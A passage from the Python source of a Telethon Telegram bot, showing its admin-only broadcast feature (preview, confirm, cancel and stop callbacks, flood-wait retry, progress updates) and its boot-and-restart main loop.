           pbtn(bs("Cancel"), f"bc_no:{event.sender_id}")]]

    # Preview message with plenty of emojis (in case user content has ⭐)
    ei = [CE["crown"], CE["crown"], CE["fire"], CE["info"], CE["star"],
          CE["gem"], CE["gift"], CE["chart"], CE["check"], CE["crown"]]
    preview = f"""{PE} <b>{bs('Broadcast Preview')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>

{decorated}

<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Total Users')}:</b> <code>{total}</code>"""

    await styled_reply(event, preview, buttons=kb, emoji_ids=ei)


@client.on(events.CallbackQuery(pattern=rb"bc_go:(\d+)"))
async def bc_go_cb(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid or uid not in ADMIN_ID:
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_BROADCAST.pop(uid, None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    await event.answer(f"{bs('Starting')}...")
    try: await event.delete()
    except: pass
    BROADCAST_TASKS[uid] = {"stopped": False}
    asyncio.create_task(_run_broadcast(uid, data["text"], data["users"]))


@client.on(events.CallbackQuery(pattern=rb"bc_no:(\d+)"))
async def bc_no_cb(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    PENDING_BROADCAST.pop(uid, None)
    await event.answer(f"{bs('Cancelled')}!", alert=True)
    try: await event.delete()
    except: pass


@client.on(events.CallbackQuery(pattern=rb"bc_stop:(\d+)"))
async def bc_stop_cb(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    if uid in BROADCAST_TASKS:
        BROADCAST_TASKS[uid]["stopped"] = True
    await event.answer(f"{bs('Stopping')}...", alert=True)


async def _broadcast_send_one(user_id, text, ei):
    try:
        text_parsed, entities = build_entities(text, ei)
        await asyncio.wait_for(
            client_instance.send_message(user_id, text_parsed,
                                          formatting_entities=entities,
                                          link_preview=False),
            timeout=15)
        return True
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds + 2)
        try:
            text_parsed, entities = build_entities(text, ei)
            await asyncio.wait_for(
                client_instance.send_message(user_id, text_parsed,
                                              formatting_entities=entities,
                                              link_preview=False),
                timeout=15)
            return True
        except: return False
    except: return False


async def _run_broadcast(admin_id, text, users):
    sent = failed = 0
    total = len(users)
    last_ui = [0]

    ei = [CE["crown"], CE["crown"], CE["fire"], CE["info"], CE["star"],
          CE["gem"], CE["gift"], CE["chart"], CE["check"], CE["crown"]]

    sm = await styled_send(admin_id,
        f"{PE} <b>{bs('Broadcasting')}...</b> 0/{total}",
        emoji_ids=[CE["fire"]])

    async def update_ui():
        if time.time() - last_ui[0] < 3.0: return
        last_ui[0] = time.time()
        try:
            kb = [[pbtn(bs("Stop"), f"bc_stop:{admin_id}")]]
            await styled_edit(sm,
                f"""{PE} <b>{bs('Broadcasting')}...</b>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Sent')}:</b> <code>{sent}</code>
{PE} <b>{bs('Failed')}:</b> <code>{failed}</code>
{PE} <b>{bs('Progress')}:</b> <code>{sent+failed}/{total}</code>""",
                buttons=kb,
                emoji_ids=[CE["fire"], CE["chart"], CE["check"], CE["cross"], CE["star"]])
        except: pass

    for user_id in users:
        if BROADCAST_TASKS.get(admin_id, {}).get("stopped"): break
        ok = await _broadcast_send_one(user_id, text, ei)
        if ok: sent += 1
        else: failed += 1
        await update_ui()
        await asyncio.sleep(0.05)

    stopped = BROADCAST_TASKS.pop(admin_id, {}).get("stopped", False)
    stop_label = f" ({bs('Stopped')})" if stopped else ""
    try:
        await styled_edit(sm,
            f"""{PE} <b>{bs('Broadcast Complete')}{stop_label}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Sent')}:</b> <code>{sent}</code>
{PE} <b>{bs('Failed')}:</b> <code>{failed}</code>
{PE} <b>{bs('Total')}:</b> <code>{total}</code>""",
            emoji_ids=[CE["crown"], CE["crown"], CE["check"], CE["cross"], CE["star"]])
    except: pass


# ====================== MAIN ======================
async def main():
    global client_instance
    client_instance = client
    log_system("BOOT", "Initializing database...")
    await init_db()
    while True:
        try:
            log_system("BOOT", "Starting bot...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ Bot Started!")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds+5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{e}", "error")
            await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(main())